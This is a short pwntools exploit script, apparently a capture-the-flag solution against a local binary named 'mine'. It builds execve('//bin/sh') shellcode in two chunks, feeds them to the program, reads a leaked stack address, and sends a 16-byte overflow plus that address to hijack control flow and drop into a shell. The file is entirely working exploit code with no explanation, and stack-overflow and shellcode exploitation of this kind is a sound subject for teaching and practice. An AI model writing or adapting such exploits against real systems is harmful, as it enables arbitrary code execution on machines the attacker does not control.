from pwn import *

context.arch = "amd64"

r = gdb.debug("./mine")

sh1 = ''
sh1 += asm('mov rbx, 0x68732f6e69622f2f')
sh1 += asm('jmp $-0x25')
print(len(sh1))
print("----------------")


sh2 = ''
sh2 += asm('xor rsi, rsi')
sh2 += asm('xor rdx, rdx')
sh2 += asm('mov al, 0x3b')
sh2 += asm('push rdx') # the null byte after //bin/sh
sh2 += asm('push rbx')
sh2 += asm('mov rdi, rsp')
sh2 += asm('syscall')
print(len(sh2))
print("----------------")


r.recvuntil(':')
r.sendline(sh1)

r.recvuntil(':')
r.sendline(sh2)

r.recvuntil('address: ')

n = r.recvuntil('\n')
print(n)
leak = int(n,16)
log.info('leak : 0x%x' % leak)

r.recvuntil('number: ')

r.sendline('a'*16 + p64(leak + 12))
r.interactive()